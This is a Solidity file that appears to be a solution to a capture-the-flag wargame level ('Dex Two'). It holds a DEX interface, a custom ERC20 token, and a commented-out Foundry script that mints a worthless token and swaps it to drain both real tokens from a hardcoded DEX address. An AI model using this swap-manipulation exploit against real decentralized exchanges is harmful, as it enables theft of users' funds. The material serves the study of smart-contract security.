// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

interface DexTwo{
    function token1() external view returns (address);
    function token2() external view returns (address);
    function setTokens(address _token1, address _token2) external;
    function add_liquidity(address token_address, uint256 amount) external;
    function swap(address from, address to, uint256 amount) external;
    function getSwapAmount(address from, address to, uint256 amount) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function balanceOf(address token, address account) external view returns (uint256);
}

contract SwappableTokenTwo is ERC20 {
    address private _dex;

    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
        ERC20(name, symbol)
    {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}

/**

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/dex2.sol";

contract CounterScript is Script {
    DexTwo target = DexTwo(0x4a726EF1A00140bbdaa5Afc557276e3014e2930b);
    address token1 = target.token1();
    address token2 = target.token2();

    function run() public {
        vm.startBroadcast();

        SwappableTokenTwo token3 = new SwappableTokenTwo(address(target), "token3", "TK3", 100);
        IERC20(token3).transfer(address(target), 1);

        do_swap(address(token3), token1, 1);
        do_swap(address(token3), token2, 2);

        vm.stopBroadcast();
    }

    function do_swap(address from, address to, uint256 amount) internal {
        SwappableTokenTwo(from).approve(address(msg.sender), address(target), amount);
        target.swap(from, to, amount);
    }  
}
 */